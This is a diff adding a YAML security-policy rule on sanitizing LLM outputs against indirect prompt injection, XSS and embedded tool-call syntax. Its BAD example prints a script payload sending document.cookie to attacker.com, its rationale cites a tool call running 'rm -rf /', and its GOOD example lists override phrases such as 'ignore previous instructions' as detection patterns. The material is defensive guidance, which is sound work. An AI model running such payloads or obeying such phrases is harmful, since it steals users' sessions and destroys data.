@@ -1,0 +1,133 @@
+metadata:
+  id: llm-output-sanitization
+  name: LLM Output Sanitization
+  description: Strip prompt-injection markers and embedded tool-invocation syntax from LLM outputs; escape outputs context-appropriately before rendering; reject outputs that contain structural command sequences.
+  version: "1.0.0"
+  tags: [ai-security, output-sanitization, prompt-injection, xss, llm]
+
+category: ai-governance
+severity: critical
+
+summary: "Sanitize every LLM output before rendering or passing downstream: strip injection markers, escape for context (HTML/SQL/shell), reject outputs containing embedded tool-invocation syntax or instruction-override sequences; never trust model output as safe. (OWASP LLM02)"
+
+asvs_controls: ["5.3.1", "5.3.3", "5.3.6"]
+iso_controls: ["A.8.26"]
+iso42001_controls: ["A.9.3", "A.9.4"]
+nist_ai_rmf: ["GOVERN-1.1", "MAP-2.3", "MANAGE-2.2"]
+cwe: ["CWE-79", "CWE-116", "CWE-77", "CWE-1336"]
+mitre_atlas: ["AML.T0051", "AML.T0054"]
+
+mythos_alignment:
+  pillar: ai-governance
+  substantiation: aligned
+  roadmap_milestone: M1
+
+sources:
+  primary:
+    - "OWASP Top 10 for LLM Applications (2025) LLM02"
+    - "OWASP ASVS v5 §5.3.1"
+    - "NIST AI 600-1 (2024) §2.5"
+    - "NIST AI RMF MAP-2.3"
+
+scope:
+  always_apply: false
+  globs:
+    - "**/llm/**"
+    - "**/prompts/**"
+    - "**/outputs/**"
+    - "**/ai/**"
+    - "**/templates/**"
+    - "**/renderers/**"
+
+enforcement:
+  mode: blocking
+  pre_commit: false
+  merge_gate: true
+  ci: true
+
+content: |
+  ## Principle
+
+  LLM output must never be trusted as safe and rendered verbatim. Treat every string returned by a language model as untrusted user input that has passed through an additional transformation. Apply context-appropriate escaping before rendering: HTML-escape before injecting into web pages; parameterize before injecting into SQL queries; quote before injecting into shell commands. Strip or reject outputs that contain: prompt-injection marker sequences ("ignore previous instructions", "you are now", delimiter patterns), embedded tool-invocation syntax (function-call JSON, MCP tool-call structures), or other structural command sequences that could be interpreted by downstream consumers.
+
+  ## Rationale
+
+  Indirect prompt injection is an increasingly exploited attack class (OWASP LLM02, 2025; MITRE ATLAS AML.T0051): an attacker embeds adversarial instructions in content that the model will later retrieve and process (web pages, documents, RAG chunks, tool outputs). The model then includes the attacker's instructions in its output, which—if rendered without sanitization—executes in the context of the application or a downstream consumer. This effectively turns LLM outputs into an injection vector for XSS, command injection, or further prompt injection.
+
+  The problem is compounded in agentic pipelines: an agent may pass LLM output as the input to a subsequent tool call or model invocation. An unescaped output containing tool-invocation syntax (`{"tool": "shell_exec", "args": "rm -rf /"}`) could be interpreted by an orchestration framework as a legitimate tool call. Structural injection in LLM outputs is a class of vulnerability with no direct predecessor in traditional web security—it requires its own sanitization layer.
+
+  NIST AI 600-1 (2024) §2.5 identifies "harmful bias and other undesirable content" as a GenAI risk; output sanitization is the principal technical control for the content-security dimension of that risk.
+
+  ## BAD example
+
+  ```pseudo
+  # LLM output rendered directly into HTML page
+  response = llm.generate(user_query)
+  html_page = f"<div>{response}</div>"   # XSS if response contains <script>
+  # LLM output containing: <script>document.location='https://attacker.com?c='+document.cookie</script>
+  # → Rendered directly: XSS attack succeeds
+
+  # LLM output passed directly to another agent tool
+  tool_call_json = llm.generate("What tool should I call next?")
+  agent.execute(json.loads(tool_call_json))   # structural injection risk
+  ```
+
+  Red flags: LLM output inserted into HTML without escaping; LLM output deserialized as structured commands; no rejection of injection-marker sequences; no structural command detection.
+
+  ## GOOD example
+
+  ```pseudo
+  response = llm.generate(user_query)
+
+  # 1. Strip known injection markers before any further processing
+  INJECTION_PATTERNS = [
+    r"ignore\s+previous\s+instructions?",
+    r"you\s+are\s+now\s+\w+",
+    r"<\|system\|>",
+    r"\[INST\]",
+  ]
+  for pattern in INJECTION_PATTERNS:
+    if re.search(pattern, response, re.IGNORECASE):
+      raise OutputRejected("Response contains injection marker; discarding.")
+
+  # 2. Reject outputs that contain tool-invocation syntax
+  TOOL_CALL_PATTERNS = [r'\{"tool":', r'\{"function":', r'<tool_call>']
+  for pattern in TOOL_CALL_PATTERNS:
+    if re.search(pattern, response):
+      raise OutputRejected("Response contains embedded tool-invocation syntax; discarding.")
+
+  # 3. Context-appropriate escaping before rendering
+  if render_context == "html":
+    safe_response = html_escape(response)
+  elif render_context == "sql":
+    safe_response = sql_parameterize(response)
+  elif render_context == "shell":
+    safe_response = shlex_quote(response)
+  else:
+    safe_response = response   # plain-text context: pass as-is
+
+  # 4. Log the sanitization action for audit
+  audit_log.record(action="output_sanitized", request_id=req_id,
+    injection_markers_found=False, render_context=render_context)
+  ```
+
+  Why this works: injection markers are detected and the response is discarded; embedded tool-invocation syntax is rejected; escaping is context-appropriate; sanitization is logged for audit; no raw model output reaches the rendering layer.
+
+  ## Checklist
+
+  - [ ] Every LLM output is scanned for known injection-marker sequences before use.
+  - [ ] Outputs containing embedded tool-invocation syntax or function-call JSON are rejected.
+  - [ ] Context-appropriate escaping is applied before rendering (HTML, SQL, shell, URL).
+  - [ ] LLM outputs are never deserialized directly as structured commands or tool calls.
+  - [ ] Output sanitization actions and rejections are logged for audit.
+  - [ ] Injection-pattern lists are updated quarterly with newly observed attack patterns.
+  - [ ] Sanitization logic is covered by automated tests (including adversarial examples).
+
+  ## References
+
+  - OWASP Top 10 for LLM Applications (2025) LLM02 — Insecure Output Handling: https://genai.owasp.org/llm-top-10/
+  - OWASP ASVS v5 §5.3 (Output Encoding and Injection Prevention): https://owasp.org/www-project-application-security-verification-standard/
+  - NIST AI 600-1 GenAI Profile (2024) §2.5: https://nvlpubs.nist.gov/nistpubs/ai/NIST.AI.600-1.pdf
+  - MITRE ATLAS AML.T0051 (LLM Prompt Injection): https://atlas.mitre.org/
+  - CWE-79 (Cross-Site Scripting): https://cwe.mitre.org/
+  - CWE-116 (Improper Encoding or Escaping of Output): https://cwe.mitre.org/
